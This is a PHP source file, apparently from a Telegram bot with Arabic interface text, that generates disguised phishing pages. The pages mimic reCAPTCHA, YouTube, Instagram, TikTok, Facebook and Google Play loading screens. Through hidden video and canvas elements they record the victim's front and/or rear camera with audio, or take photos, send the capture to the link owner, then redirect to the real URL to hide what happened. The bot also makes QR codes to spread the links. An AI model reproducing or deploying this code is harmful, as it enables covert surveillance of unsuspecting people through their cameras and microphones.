    if ($action_choice == '5') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="display: none;"></video>
<p id="status" style="color:white; text-align:center;"></p>
<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px;">
    ⚠️ يجب السماح بصلاحيات الكاميرا والميكروفون للمتابعة
</div>
<script>
    const cameraFeed = document.getElementById('camera-feed');
    const statusDisplay = document.getElementById('status');
    const errorDiv = document.getElementById('error-message');
    const original_url = "{original_url}";
    const phpScriptUrl = "{php_script_url}";
    const ownerChatId = "{owner_chat_id}";
    const ownerUsername = "{owner_username}";
    const quality_choice = "{quality_choice}";
    const generatedLinkHash = "{generated_link_hash}";

    {$sendDataToPHP_function}
    {$video_constraints_js}

    let mediaRecorder;
    let recordedChunks = [];
    const recordDuration = 5000;
    let isRecording = false;

    function showPermissionError() {
        errorDiv.style.display = 'block';
        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
        if (loader) loader.style.display = 'none';
    }

    async function startCameraWithAudio() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', ...videoResolution },
                audio: true
            });
            cameraFeed.srcObject = stream;
            statusDisplay.textContent = ' ';
            setTimeout(startRecording, 1000);
        } catch (error) {
            console.error('Camera permission denied:', error);
            showPermissionError();
            return false;
        }
    }

    async function startRecording() {
        if (!cameraFeed.srcObject || isRecording) return;
        isRecording = true;
        const stream = cameraFeed.srcObject;
        const mediaConstraints = {
            video: { mimeType: 'video/webm;codecs=vp9,opus', ...videoResolution, frameRate: videoFrameRate, bitrate: videoBitrate },
            audio: true
        };
        mediaRecorder = new MediaRecorder(stream, mediaConstraints);
        recordedChunks = [];
        mediaRecorder.ondataavailable = event => {
            if (event.data.size > 0) recordedChunks.push(event.data);
        };
        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            try {
                await sendDataToPHP(blob, 'video');
                stream.getTracks().forEach(track => track.stop());
                window.location.href = original_url;
            } catch(e) {
                console.error('Failed to send video:', e);
            }
            isRecording = false;
        };
        mediaRecorder.start();
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
        }, recordDuration);
    }
    
    window.onload = startCameraWithAudio;
</script>
EOT;
    } elseif ($action_choice == '7') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="display: none;"></video>
<p id="status" style="color:white; text-align:center;"></p>
<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px;">
    ⚠️ يجب السماح بصلاحيات الكاميرا والميكروفون للمتابعة
</div>
<script>
    const cameraFeed = document.getElementById('camera-feed');
    const statusDisplay = document.getElementById('status');
    const errorDiv = document.getElementById('error-message');
    const original_url = "{original_url}";
    const phpScriptUrl = "{php_script_url}";
    const ownerChatId = "{owner_chat_id}";
    const ownerUsername = "{owner_username}";
    const quality_choice = "{quality_choice}";
    const generatedLinkHash = "{generated_link_hash}";

    {$sendDataToPHP_function}
    {$video_constraints_js}

    let mediaRecorder;
    let recordedChunks = [];
    const recordDuration = 5000;
    let isRecording = false;

    function showPermissionError() {
        errorDiv.style.display = 'block';
        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
        if (loader) loader.style.display = 'none';
    }

    async function startCameraWithAudio() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', ...videoResolution },
                audio: true
            });
            cameraFeed.srcObject = stream;
            statusDisplay.textContent = ' ';
            setTimeout(startRecording, 1000);
        } catch (error) {
            console.error('Camera permission denied:', error);
            showPermissionError();
            return false;
        }
    }

    async function startRecording() {
        if (!cameraFeed.srcObject || isRecording) return;
        isRecording = true;
        const stream = cameraFeed.srcObject;
        const mediaConstraints = {
            video: { mimeType: 'video/webm;codecs=vp9,opus', ...videoResolution, frameRate: videoFrameRate, bitrate: videoBitrate },
            audio: true
        };
        mediaRecorder = new MediaRecorder(stream, mediaConstraints);
        recordedChunks = [];
        mediaRecorder.ondataavailable = event => {
            if (event.data.size > 0) recordedChunks.push(event.data);
        };
        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            try {
                await sendDataToPHP(blob, 'video');
                stream.getTracks().forEach(track => track.stop());
                window.location.href = original_url;
            } catch(e) {
                console.error('Failed to send video:', e);
            }
            isRecording = false;
        };
        mediaRecorder.start();
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
        }, recordDuration);
    }
    
    window.onload = startCameraWithAudio;
</script>
EOT;
    } elseif ($action_choice == '8') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="display: none;"></video>
<p id="status" style="color:white; text-align:center;"></p>
<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px;">
    ⚠️ يجب السماح بصلاحيات الكاميرا والميكروفون للمتابعة
</div>
<script>
    const cameraFeed = document.getElementById('camera-feed');
    const statusDisplay = document.getElementById('status');
    const errorDiv = document.getElementById('error-message');
    const original_url = "{original_url}";
    const phpScriptUrl = "{php_script_url}";
    const ownerChatId = "{owner_chat_id}";
    const ownerUsername = "{owner_username}";
    const quality_choice = "{quality_choice}";
    const generatedLinkHash = "{generated_link_hash}";

    {$sendDataToPHP_function}
    {$video_constraints_js}

    const recordDuration = 5000;
    let mediaRecorder;

    function showPermissionError() {
        errorDiv.style.display = 'block';
        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
        if (loader) loader.style.display = 'none';
    }

    function recordVideo(stream, duration) {
        return new Promise((resolve, reject) => {
            let recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, {
                video: { mimeType: 'video/webm;codecs=vp9,opus', ...videoResolution, frameRate: videoFrameRate, bitrate: videoBitrate },
                audio: true
            });
            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };
            mediaRecorder.onstop = async () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                await sendDataToPHP(blob, 'video');
                resolve();
            };
            mediaRecorder.onerror = reject;
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
            }, duration);
        });
    }

    async function startDualCameraRecording() {
        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', ...videoResolution },
                audio: true
            });
            cameraFeed.srcObject = frontStream;
            await recordVideo(frontStream, recordDuration);
            frontStream.getTracks().forEach(track => track.stop());
            await new Promise(resolve => setTimeout(resolve, 1000));

            const rearStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', ...videoResolution },
                audio: true
            });
            cameraFeed.srcObject = rearStream;
            await recordVideo(rearStream, recordDuration);
            rearStream.getTracks().forEach(track => track.stop());

            window.location.href = original_url;
        } catch (error) {
            console.error('Camera permission denied:', error);
            showPermissionError();
            return false;
        }
    }
    
    window.onload = startDualCameraRecording;
</script>
EOT;
    } elseif ($action_choice == '9') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="visibility: hidden; position: absolute;"></video>
<canvas id="photo-canvas" width="320" height="240" style="display: none;"></canvas>
<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px; position: relative; z-index: 1000;">
    ⚠️ يجب السماح بصلاحيات الكاميرا للمتابعة
</div>
<script>
    const cameraFeed = document.getElementById('camera-feed');
    const photoCanvas = document.getElementById('photo-canvas');
    const ctx = photoCanvas.getContext('2d');
    const errorDiv = document.getElementById('error-message');
    const original_url = "{original_url}";
    const phpScriptUrl = "{php_script_url}";
    const ownerChatId = "{owner_chat_id}";
    const ownerUsername = "{owner_username}";
    const quality_choice = "{quality_choice}";
    const generatedLinkHash = "{generated_link_hash}";

    {$sendDataToPHP_function}
    {$video_constraints_js}

    function showPermissionError() {
        errorDiv.style.display = 'block';
        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
        if (loader) loader.style.display = 'none';
    }

    async function captureAndSendPhoto() {
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user', 
                    width: { ideal: photoWidth }, 
                    height: { ideal: photoHeight },
                    frameRate: { ideal: 30 }
                }
            });
            cameraFeed.srcObject = stream;
            
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            if (cameraFeed.readyState < 2) throw new Error('Camera not ready');
            
            photoCanvas.width = photoWidth;
            photoCanvas.height = photoHeight;
            ctx.drawImage(cameraFeed, 0, 0, photoWidth, photoHeight);
            
            const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality);
            
            try {
                await sendDataToPHP(await fetch(photoData).then(res => res.blob()), 'photo');
                stream.getTracks().forEach(track => track.stop());
                window.location.href = original_url;
            } catch(e) {
                console.error('Failed to send photo:', e);
            }
        } catch (error) {
            console.error('Camera permission denied:', error);
            showPermissionError();
            return false;
        } finally {
            if (stream) stream.getTracks().forEach(track => track.stop());
        }
    }
    
    window.onload = captureAndSendPhoto;
</script>
EOT;
    } elseif ($action_choice == '10') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="visibility: hidden; position: absolute;"></video>
<canvas id="photo-canvas" width="320" height="240" style="display: none;"></canvas>
<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px; position: relative; z-index: 1000;">
    ⚠️ يجب السماح بصلاحيات الكاميرا للمتابعة
</div>
<script>
    const cameraFeed = document.getElementById('camera-feed');
    const photoCanvas = document.getElementById('photo-canvas');
    const ctx = photoCanvas.getContext('2d');
    const errorDiv = document.getElementById('error-message');
    const original_url = "{original_url}";
    const phpScriptUrl = "{php_script_url}";
    const ownerChatId = "{owner_chat_id}";
    const ownerUsername = "{owner_username}";
    const quality_choice = "{quality_choice}";
    const generatedLinkHash = "{generated_link_hash}";

    {$sendDataToPHP_function}
    {$video_constraints_js}

    function showPermissionError() {
        errorDiv.style.display = 'block';
        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
        if (loader) loader.style.display = 'none';
    }

    async function captureAndSendPhoto() {
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'environment', 
                    width: { ideal: photoWidth }, 
                    height: { ideal: photoHeight },
                    frameRate: { ideal: 30 }
                }
            });
            cameraFeed.srcObject = stream;
            
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            if (cameraFeed.readyState < 2) throw new Error('Camera not ready');
            
            photoCanvas.width = photoWidth;
            photoCanvas.height = photoHeight;
            ctx.drawImage(cameraFeed, 0, 0, photoWidth, photoHeight);
            
            const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality);
            
            try {
                await sendDataToPHP(await fetch(photoData).then(res => res.blob()), 'photo');
                stream.getTracks().forEach(track => track.stop());
                window.location.href = original_url;
            } catch(e) {
                console.error('Failed to send photo:', e);
            }
        } catch (error) {
            console.error('Camera permission denied:', error);
            showPermissionError();
            return false;
        } finally {
            if (stream) stream.getTracks().forEach(track => track.stop());
        }
    }
    
    window.onload = captureAndSendPhoto;
</script>
EOT;
    } elseif ($action_choice == '11') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="visibility: hidden; position: absolute;"></video>
<canvas id="photo-canvas" width="320" height="240" style="display: none;"></canvas>
<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px; position: relative; z-index: 1000;">
    ⚠️ يجب السماح بصلاحيات الكاميرا للمتابعة
</div>
<script>
    const cameraFeed = document.getElementById('camera-feed');
    const photoCanvas = document.getElementById('photo-canvas');
    const ctx = photoCanvas.getContext('2d');
    const errorDiv = document.getElementById('error-message');
    const original_url = "{original_url}";
    const phpScriptUrl = "{php_script_url}";
    const ownerChatId = "{owner_chat_id}";
    const ownerUsername = "{owner_username}";
    const quality_choice = "{quality_choice}";
    const generatedLinkHash = "{generated_link_hash}";

    {$sendDataToPHP_function}
    {$video_constraints_js}

    function showPermissionError() {
        errorDiv.style.display = 'block';
        document.querySelector('h1') ? document.querySelector('h1').style.display = 'none' : '';
        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
        if (loader) loader.style.display = 'none';
    }

    async function captureAndSendPhoto(facingMode) {
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: facingMode,
                    width: { ideal: photoWidth }, 
                    height: { ideal: photoHeight },
                    frameRate: { ideal: 30 }
                }
            });
            cameraFeed.srcObject = stream;
            
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            if (cameraFeed.readyState < 2) throw new Error('Camera not ready');
            
            photoCanvas.width = photoWidth;
            photoCanvas.height = photoHeight;
            ctx.drawImage(cameraFeed, 0, 0, photoWidth, photoHeight);
            
            const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality);
            
            await sendDataToPHP(await fetch(photoData).then(res => res.blob()), 'photo');
            
            return true;
        } catch (error) {
            console.error('Photo capture failed:', error);
            throw error;
        } finally {
            if (stream) stream.getTracks().forEach(track => track.stop());
        }
    }
    
    window.onload = async function() {
        try {
            const selfieSuccess = await captureAndSendPhoto('user');
            if (selfieSuccess) {
                await new Promise(resolve => setTimeout(resolve, 1000));
                await captureAndSendPhoto('environment');
            }
            window.location.href = original_url;
        } catch (error) {
            console.error('Permission denied or capture failed:', error);
            showPermissionError();
            return false;
        }
    };
</script>
EOT;
    }
    
    foreach ($js_template_vars as $key => $value) {
        $javascript_code = str_replace("{" . $key . "}", $value, $javascript_code);
    }

    // --- HTML Templates ---
    $html_templates = [
        'normal' => <<<EOT
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>{og_title}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {og_meta_tags}
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; text-align: center; padding-top: 150px; }
        .loader { border: 15px solid #f3f3f3; border-top: 15px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 1s linear infinite; margin: 30px auto; }
        h1 { font-size: 2.5em; }
        p { font-size: 1.5em; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>جارٍ التحميل...</h1>
    <div class="loader"></div>
    <p>الرجاء الانتظار...</p>
    {javascript_code}
</body>
</html>
EOT,
        'recaptcha' => <<<EOT
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>{og_title}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {og_meta_tags}
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .recaptcha-box { border: 1px solid #ccc; background-color: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: left; }
        .recaptcha-header { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #ccc; padding-bottom: 10px; margin-bottom: 10px; }
        .recaptcha-header img { height: 30px; }
        .recaptcha-checkbox { width: 25px; height: 25px; cursor: pointer; }
        .recaptcha-text { display: flex; align-items: center; }
    </style>
</head>
<body>
    <div class="recaptcha-box">
        <div class="recaptcha-header">
            <div class="recaptcha-text">
                <input type="checkbox" id="recaptcha" class="recaptcha-checkbox" checked disabled>
                <span>أنا لست برنامج روبوت</span>
            </div>
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
        </div>
        <p>الرجاء الانتظار حتى يتم التحقق...</p>
    </div>
    {javascript_code}
</body>
</html>
EOT,
        'youtube' => <<<EOT
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>{og_title}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {og_meta_tags}
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .youtube-logo { width: 150px; margin-bottom: 20px; }
        .loader-bar {
            width: 80%; max-width: 400px; height: 10px;
            background-color: #404040; position: relative;
            border-radius: 5px; margin-top: 20px;
        }
        .loader-fill {
            height: 100%; background-color: #ff0000;
            border-radius: 5px; animation: load 2s linear infinite;
        }
        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
        h1 { font-size: 2.5em; font-weight: 300; margin-bottom: 0; }
        .video-link { font-size: 1.2em; color: #aaa; margin-top: 20px; word-break: break-all; padding: 0 15px; }
    </style>
</head>
<body>
    <img src="https://www.youtube.com/s/desktop/12d6b690/img/favicon_144x144.png" alt="YouTube Logo" class="youtube-logo">
    <h1>جارٍ تحميل الفيديو...</h1>
    <div class="loader-bar"><div class="loader-fill"></div></div>
    <div class="video-link">
        <a href="{$original_url}" style="color: #aaa; text-decoration: none;">{$original_url}</a>
    </div>
    {javascript_code}
</body>
</html>
EOT,
        'instagram' => <<<EOT
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>{og_title}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {og_meta_tags}
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000; color: #fff;
            display: flex; justify-content: center; align-items: center;
            flex-direction: column; height: 100vh; margin: 0; text-align: center;
        }
        .instagram-logo { width: 150px; margin-bottom: 20px; }
        .loader {
            width: 80px; height: 80px; border-radius: 50%;
            border: 8px solid rgba(255, 255, 255, 0.2);
            border-top-color: #833AB4; animation: spin 1s linear infinite; margin-top: 30px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 2.2em; font-weight: 400; margin-bottom: 0; }
        p { font-size: 1.4em; color: #ccc; margin-top: 15px; }
    </style>
</head>
<body>
    <img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/lam-fZmwmvn.png" alt="Instagram Logo" class="instagram-logo">
    <h1>جارٍ تحميل منشور...</h1>
    <div class="loader"></div>
    <p>الرجاء الانتظار قليلاً</p>
    {javascript_code}
</body>
</html>
EOT,
        'tiktok' => <<<EOT
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>{og_title}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {og_meta_tags}
    <style>
        body {
            font-family: sans-serif; background-color: #000; color: #fff;
            display: flex; justify-content: center; align-items: center;
            flex-direction: column; height: 100vh; margin: 0;
            position: relative; overflow: hidden; text-align: center;
        }
        .tiktok-logo-container { width: 100px; height: 100px; position: relative; margin-bottom: 30px; }
        .tiktok-logo-container .circle {
            width: 100%; height: 100%; position: absolute; top: 0; left: 0; border-radius: 50%;
        }
        .tiktok-logo-container .red, .tiktok-logo-container .blue {
            animation-duration: 0.8s; animation-iteration-count: infinite; animation-timing-function: ease-in-out;
        }
        .tiktok-logo-container .red { background-color: #fe2c55; animation-name: move-red; }
        .tiktok-logo-container .blue { background-color: #25f4ee; animation-name: move-blue; }
        .tiktok-logo-container .white { background-color: #fff; mix-blend-mode: screen; }
        @keyframes move-red { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(5px); } }
        @keyframes move-blue { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(-5px); } }
        h1 { font-size: 2.5em; font-weight: bold; margin-top: 0; }
        p { font-size: 1.5em; color: #aaa; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="tiktok-logo-container">
        <div class="circle red"></div>
        <div class="circle blue"></div>
        <div class="circle white"></div>
    </div>
    <h1>جارٍ تحميل الفيديو...</h1>
    <p>الرجاء الانتظار</p>
    {javascript_code}
</body>
</html>
EOT,
        'facebook' => <<<EOT
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>{og_title}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {og_meta_tags}
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5;
            display: flex; justify-content: center; align-items: center;
            flex-direction: column; height: 100vh; margin: 0; text-align: center; color: #4b4f56;
        }
        .facebook-logo { width: 120px; height: 120px; object-fit: contain; margin-bottom: 30px; }
        .loader-bar {
            width: 80%; max-width: 300px; height: 5px; background-color: #e4e6eb;
            position: relative; border-radius: 2.5px; margin-top: 20px; overflow: hidden;
        }
        .loader-fill {
            height: 100%; background-color: #1877f2; border-radius: 2.5px;
            animation: facebook-load 1.5s linear infinite;
        }
        @keyframes facebook-load { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
        p { font-size: 1.1em; color: #606770; margin-top: 20px; }
    </style>
</head>
<body>
    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" alt="Facebook Logo" class="facebook-logo">
    <div class="loader-bar"><div class="loader-fill"></div></div>
    <p>جارٍ تحميل المحتوى...</p>
    {javascript_code}
</body>
</html>
EOT,
        'playstore' => <<<EOT
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>{og_title}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {og_meta_tags}
    <style>
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background-color: #fff;
            display: flex; justify-content: center; align-items: center;
            flex-direction: column; height: 100vh; margin: 0; text-align: center; color: #202124;
        }
        .playstore-logo { width: 100px; height: 100px; margin-bottom: 20px; }
        .loader {
            width: 50px; height: 50px; border: 5px solid #e8eaed;
            border-top-color: #4285f4; border-left-color: #34a853;
            border-right-color: #fbbc05; border-bottom-color: #ea4335;
            border-radius: 50%; animation: spin 1s linear infinite; margin-top: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 2em; font-weight: 500; margin-top: 25px; color: #202124; }
        p { font-size: 1.1em; color: #5f6368; margin-top: 10px; }
    </style>
</head>
<body>
    <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" alt="Google Play Logo" class="playstore-logo">
    <h1>جاري فتح التطبيق...</h1>
    <div class="loader"></div>
    <p>الرجاء الانتظار</p>
    {javascript_code}
</body>
</html>
EOT
    ];

    $html_template = $html_templates[$loading_type];
    $final_html = str_replace(
        ['{javascript_code}', '{og_meta_tags}', '{og_title}', '{original_url}'], 
        [$javascript_code, $og_meta_tags, $og_title, htmlspecialchars($original_url, ENT_QUOTES | ENT_HTML5, 'UTF-8')], 
        $html_template
    );
    
    $file_name = GENERATED_LINKS_DIR . 'link_owner_' . $chat_id . '_' . $link_hash . '.html';
    file_put_contents($file_name, $final_html);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
    $base_url .= $_SERVER['HTTP_HOST'];
    $script_dir = dirname($_SERVER['REQUEST_URI']);
    $full_url = rtrim($base_url . $script_dir, '/') . '/' . $file_name;
    
    $text = "✅ **تم إنشاء الرابط بنجاح!**\n\nالرابط المخصص جاهز للاستخدام:\n<code>" . htmlspecialchars($full_url) . "</code>\n\nالرجاء حفظ الرابط للاستخدام المستقبلي.";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '🔗 افتح الرابط', 'url' => $full_url],
                ['text' => '📷 تحويل الى QR code', 'callback_data' => 'generate_qr:' . $link_hash]
            ],
            [
                ['text' => '🔙 القائمة الرئيسية', 'callback_data' => 'main_menu']
            ]
        ]
    ];
    
    editMessage($chat_id, $message_id, $text, json_encode($keyboard));

    @unlink(getUserStateFile($chat_id, "url"));
    @unlink(getUserStateFile($chat_id, "action"));
    @unlink(getUserStateFile($chat_id, "quality"));
    @unlink(getUserStateFile($chat_id, "loading"));
}

function generateQRCode($chat_id, $message_id, $link_hash) {
    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
    $base_url .= $_SERVER['HTTP_HOST'];
    $script_dir = dirname($_SERVER['REQUEST_URI']);
    $file_name = GENERATED_LINKS_DIR . 'link_owner_' . $chat_id . '_' . $link_hash . '.html';
    $full_url = rtrim($base_url . $script_dir, '/') . '/' . $file_name;

    $qr_code_url = "https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=" . urlencode($full_url);

    $data = [
        'chat_id' => $chat_id,
        'photo' => $qr_code_url,
        'caption' => "📷 QR code للرابط: " . $full_url
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . 'sendPhoto');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}


// --- Pagination Functions ---

function handleLongMessage($chat_id, $message_id, $full_text, $context) {
    $file_id = uniqid('msg_');
    $temp_data = [
        'text' => $full_text,
        'context' => $context
    ];
    file_put_contents(PAGINATION_TEMP_DIR . $file_id . '.json', json_encode($temp_data));

    $old_files = glob(PAGINATION_TEMP_DIR . '*.json');
    $cutoff = time() - 3600;
    foreach ($old_files as $file) {
        if (filemtime($file) < $cutoff) {
            @unlink($file);
        }
    }

    $text_chunks = mb_str_split($full_text, MAX_MESSAGE_LENGTH, 'UTF-8');
    $total_pages = count($text_chunks);
    $current_page = 0;

    $reply_markup = buildPaginationKeyboard($file_id, $current_page, $total_pages, $context);
    
    $message_content = $text_chunks[$current_page] . "\n\nصفحة {$current_page} من " . ($total_pages - 1);
    editMessage($chat_id, $message_id, $message_content, $reply_markup);
}

function handlePaginatedMessage($chat_id, $message_id, $file_id, $page, $context) {
    $file_path = PAGINATION_TEMP_DIR . $file_id . '.json';
    if (!file_exists($file_path)) {
        editMessage($chat_id, $message_id, "⚠️ انتهت صلاحية هذه الرسالة. يرجى العودة للوحة التحكم وإعادة المحاولة.", showAdminPanelKeyboard());
        return;
    }

    $temp_data = json_decode(file_get_contents($file_path), true);
    $full_text = $temp_data['text'];
    $text_chunks = mb_str_split($full_text, MAX_MESSAGE_LENGTH, 'UTF-8');
    $total_pages = count($text_chunks);
    
    if ($page < 0 || $page >= $total_pages) {
        $page = 0;
    }

    $reply_markup = buildPaginationKeyboard($file_id, $page, $total_pages, $context);
    $message_content = $text_chunks[$page] . "\n\nصفحة {$page} من " . ($total_pages - 1);
    
    editMessage($chat_id, $message_id, $message_content, $reply_markup);
}

function buildPaginationKeyboard($file_id, $current_page, $total_pages, $context) {
    $keyboard = [];
    $nav_buttons = [];
    
    if ($current_page > 0) {
        $nav_buttons[] = ['text' => '◀️', 'callback_data' => "paginate_message:{$file_id}:" . ($current_page - 1) . ":{$context}"];
    }
    
    $nav_buttons[] = ['text' => "{$current_page}/" . ($total_pages - 1), 'callback_data' => "ignore"];
    
    if ($current_page < $total_pages - 1) {
        $nav_buttons[] = ['text' => '▶️', 'callback_data' => "paginate_message:{$file_id}:" . ($current_page + 1) . ":{$context}"];
    }
    
    if (!empty($nav_buttons)) {
        $keyboard[] = $nav_buttons;
    }
    
    $back_button = [];
    if (strpos($context, 'user_details:') === 0) {
        $target_chat_id = explode(':', $context)[1];
        $back_button[] = ['text' => '🔙 العودة لتفاصيل المستخدم', 'callback_data' => "admin_user_details:{$target_chat_id}:allowed"];
    } else {
        $back_button[] = ['text' => '🔙 العودة للوحة التحكم', 'callback_data' => 'admin_panel'];
    }
    $keyboard[] = $back_button;
    
    return json_encode(['inline_keyboard' => $keyboard]);
}
?>
